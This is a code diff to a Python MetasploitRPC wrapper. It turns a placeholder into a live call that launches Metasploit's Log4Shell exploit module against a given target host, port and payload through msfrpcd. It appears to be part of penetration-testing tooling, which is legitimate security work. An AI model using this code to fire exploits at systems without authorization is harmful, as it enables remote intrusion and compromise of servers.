@@ -34,11 +34,17 @@ class MetasploitRPC:
         if not self.authenticated:
             await self._authenticate()
         if not self.authenticated:
-            return {"error": "Authentication failed"}
-        # Placeholder – real integration would use pymetasploit3
-        return {
-            "status": "triggered",
-            "payload": payload,
-            "target": target,
-            "command": f"msfconsole -x 'use exploit/multi/http/log4shell_header; set RHOSTS {target}; run'"
+            return {"error": "Authentication failed. Start msfrpcd first."}
+        args = {
+            "module": "exploit/multi/http/log4shell_header",
+            "options": {
+                "RHOSTS": target,
+                "RPORT": port,
+                "PAYLOAD": payload
+            }
         }
+        try:
+            result = await self._call("exploit", args)
+            return result
+        except Exception as e:
+            return {"error": f"Exploit failed: {e}"}
